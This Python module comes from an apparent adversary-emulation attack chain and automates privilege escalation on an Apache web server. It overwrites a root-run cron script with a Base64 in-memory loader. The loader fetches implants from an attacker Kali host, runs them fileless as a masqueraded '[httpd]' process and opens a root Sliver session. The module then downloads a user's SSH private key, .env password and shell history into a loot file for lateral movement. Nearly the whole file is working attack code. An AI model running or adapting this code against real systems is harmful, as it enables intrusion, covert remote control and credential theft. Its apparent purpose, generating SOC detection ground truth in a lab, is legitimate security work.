"""Advanced privesc + credential harvest on the apache webserver.

Two sub-phases in one chain step:

  A. Cron-overwrite privesc (T1053.003 + T1620 + T1036.005)
     Build the same Base64 in-memory loader the initial exploit uses and
     write it into ``/opt/cleanup.sh`` via the Sliver session implant. The
     misconfigured cron entry (``/etc/cron.d/cleanup`` runs the script every
     minute as root) fires the loader, which spawns a fresh fileless
     ``[httpd]`` masqueraded process running as root and calls back to the
     Sliver listener as a new session.

  B. Credential harvest as root (T1552.001 + T1552.004)
     Once the root session is live, the previously perm-denied files in
     ``/home/john.stravidis/`` are in scope. Pull them via Sliver
     ``download`` into the per-run results dir under
     ``<results_dir>/webserver-loot/`` and stage them in ``ctx.state`` for
     PR-C (apache -> john lateral via the stolen SSH key).

The T1505.003 web-shell persistence drop is delivered by a separate chain
step, :mod:`advanced_webserver_persistence`, so the SOC ground truth gives
that tactic its own narrow start/end window.
"""
# MITRE ATT&CK:
#   T1053.003 – Scheduled Task/Job: Cron               (privesc vector)
#   T1068     – Exploitation for Privilege Escalation
#   T1620     – Reflective Code Loading                (in-memory root payload)
#   T1036.005 – Masquerading: Match Legitimate Name    (`[httpd]` argv[0], now root)
#   T1552.001 – Unsecured Credentials: Credentials In Files  (john's .env as root)
#   T1552.004 – Unsecured Credentials: Private Keys    (john's id_ed25519 as root)

import json
import re
import time
from pathlib import Path

from chainlog import log
from advanced_initial_access import (
    build_payload,
    sliver_exec,
    sliver_upload,
    _list_sliver,
    _SESSION_HEADER_RE,
)

# How long to wait for the next cron tick after overwriting cleanup.sh.
CRON_POLL_INTERVAL_SECS = 5
CRON_POLL_MAX_SECS      = 80   # cron runs every minute; 80s covers >= 1 tick

# Files to harvest as root once the cron has triggered. The .ssh/id_ed25519
# is the primary credential consumed by PR-C lateral movement; .env is the
# fallback password; the rest are intelligence for the SOC ground-truth.
HARVEST_PATHS = [
    "/home/john.stravidis/.ssh/id_ed25519",
    "/home/john.stravidis/.ssh/config",
    "/home/john.stravidis/.env",
    "/home/john.stravidis/.bash_history",
    "/opt/waystar-connect/deploy.log",
]

# Loot file inside the run's results dir. PR-C reads this to bootstrap john_ws.
LOOT_FILENAME = "webserver-loot.json"


def _build_root_loader_script(kali_host: str, file_port: int = 8000) -> str:
    """Compose the bash script that gets written into ``/opt/cleanup.sh``.

    The bash one-liner decodes the Base64 Python loader and pipes it into
    ``python3``. The loader itself (from ``advanced_initial_access.build_payload``)
    fetches the implant binaries from ``kali:8000`` and execve's them as
    ``[httpd]`` via ``memfd_create``. When cron runs this as root, the new
    implant inherits root.

    Output is suppressed so the cron daemon's MAILTO logic doesn't email a
    flood of stdout each minute.
    """
    b64 = build_payload(kali_host, file_port)
    return (
        "#!/bin/bash\n"
        "# /opt/cleanup.sh -- maintenance helper (overwritten by attacker).\n"
        f"echo {b64} | base64 -d | python3 >/dev/null 2>&1\n"
    )


def _parse_root_session_id(sliver_output: str, exclude: set[str]) -> str | None:
    """Find the first session whose Username column == 'root' and isn't in ``exclude``.

    Sliver's session table has a row per active session; we need the one that
    appeared *after* the cron tick, ergo not in the set we captured before
    overwriting cleanup.sh.
    """
    saw_header = False
    for line in sliver_output.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            return None
        if set(stripped) <= set("= "):
            continue
        parts = stripped.split()
        if len(parts) < 5:
            continue
        sess_id = parts[0]
        if sess_id in exclude:
            continue
        # Username is one of the middle columns; just scan for 'root' since
        # the table layout has changed across Sliver versions.
        if "root" in parts:
            return sess_id
    return None


def _capture_existing_session_ids() -> set[str]:
    """Snapshot the set of currently-active session IDs."""
    out = _list_sliver("sessions")
    ids: set[str] = set()
    saw_header = False
    for line in out.splitlines():
        if _SESSION_HEADER_RE.search(line):
            saw_header = True
            continue
        if not saw_header:
            continue
        stripped = line.strip()
        if not stripped:
            break
        if set(stripped) <= set("= "):
            continue
        ids.add(stripped.split()[0])
    return ids


def subphase_cron_overwrite(sliver_session_id: str, cron_script: str,
                            kali_host: str, scratch_dir: Path) -> str:
    """Sub-phase A: write the loader into ``cron_script`` and wait for the root callback."""
    log("\n=== Sub-phase A: cron overwrite + wait for root callback ===")
    log(f"[*] Building Base64 in-memory loader (target callback: {kali_host}:8080)")

    loader = _build_root_loader_script(kali_host)
    local_loader = scratch_dir / "cleanup.sh"
    local_loader.write_text(loader, encoding="utf-8")
    log(f"[+] Local stager: {local_loader} ({len(loader)} bytes)")

    before = _capture_existing_session_ids()
    log(f"[*] Existing session(s) before cron tick: {sorted(before)}")

    log(f"[*] sliver: upload {local_loader} -> {cron_script}  (chmod 755)")
    sliver_upload(sliver_session_id, str(local_loader), cron_script, chmod="755")
    # Confirm the upload landed; useful when debugging cron-tick failures.
    sliver_exec(sliver_session_id, f"execute -o ls -la {cron_script}")
    log("[*] Cron will fire within 60 s -- polling for the new root session...")

    deadline = time.time() + CRON_POLL_MAX_SECS
    while time.time() < deadline:
        time.sleep(CRON_POLL_INTERVAL_SECS)
        out = _list_sliver("sessions")
        root_id = _parse_root_session_id(out, exclude=before)
        if root_id:
            log(f"[+] New root session captured: {root_id}")
            return root_id
        log("[*] still waiting for cron tick...")
    raise RuntimeError(
        "advanced_webserver_privesc: cron tick produced no new root session "
        f"within {CRON_POLL_MAX_SECS} s; check sliver-client > sessions manually"
    )


def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
    """Sub-phase B: as root via the new session, pull John's creds + intel files."""
    log("\n=== Sub-phase B: credential harvest as root ===")
    loot_dir = scratch_dir / "downloads"
    loot_dir.mkdir(parents=True, exist_ok=True)

    files: dict[str, str | None] = {}
    for remote_path in HARVEST_PATHS:
        local_name = Path(remote_path).name
        local_target = loot_dir / local_name
        log(f"[*] sliver: download {remote_path} -> {local_target}")
        sliver_exec(
            root_session_id,
            f"download {remote_path} {local_target}",
            timeout=20,
        )
        if local_target.is_file():
            try:
                files[remote_path] = local_target.read_text(
                    encoding="utf-8", errors="replace"
                )
                log(f"[+] harvested {remote_path}  ({local_target.stat().st_size} bytes)")
            except Exception as e:
                log(f"[-] could not read local {local_target}: {e}")
                files[remote_path] = None
        else:
            log(f"[-] download produced no local file at {local_target}")
            files[remote_path] = None

    # Extract the WS_PASS=value from the .env if it landed.
    env_blob = files.get("/home/john.stravidis/.env") or ""
    m = re.search(r"^WS_PASS=(.+)$", env_blob, re.MULTILINE)
    john_password = m.group(1).strip().strip('"').strip("'") if m else None

    return {
        "john_ssh_key":     files.get("/home/john.stravidis/.ssh/id_ed25519"),
        "john_ssh_config":  files.get("/home/john.stravidis/.ssh/config"),
        "john_env":         env_blob or None,
        "john_password":    john_password,
        "john_bash_history": files.get("/home/john.stravidis/.bash_history"),
        "deploy_log":       files.get("/opt/waystar-connect/deploy.log"),
        "john_username":    "john.stravidis",
    }


def run(sliver_session_id: str, cron_script: str,
        kali_host: str = "10.10.0.2",
        results_dir: str = "/Attack-chain/results") -> dict:
    """Run the privesc + credential-harvest step.

    Args:
        sliver_session_id: ID of the www-data session implant (from PR-B exploit).
        cron_script:       Writable root cron path discovered by the enum step.
        kali_host:         IP the new root loader calls back to.
        results_dir:       Per-run dir to write ``webserver-loot.json`` into.

    Returns: dict for ``ctx.state`` with ``root_sliver_session`` +
             ``john_ssh_key`` + ``john_password`` + intel files. Also writes
             ``<results_dir>/webserver-loot.json`` for downstream consumption.
    """
    scratch_dir = Path(results_dir) / "webserver-loot"
    scratch_dir.mkdir(parents=True, exist_ok=True)

    log(f"\n[*] Starting advanced webserver privesc -> root via {cron_script}")
    root_id = subphase_cron_overwrite(
        sliver_session_id, cron_script, kali_host, scratch_dir,
    )

    loot = subphase_harvest_creds(root_id, scratch_dir)
    loot["root_sliver_session"] = root_id

    # Persist the loot for the SOC ground truth + the next PR.
    loot_json_path = scratch_dir / LOOT_FILENAME
    loot_json_path.write_text(
        json.dumps(loot, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    log(f"[+] Wrote loot bundle: {loot_json_path}")

    log("\n" + "=" * 60)
    log("[*] Webserver privesc + harvest complete:")
    log(f"    root_sliver_session : {root_id}")
    log(f"    john_ssh_key bytes  : {len(loot.get('john_ssh_key') or '')}")
    log(f"    john_password       : {loot.get('john_password')}")
    log(f"    deploy_log bytes    : {len(loot.get('deploy_log') or '')}")
    log("=" * 60)

    return loot
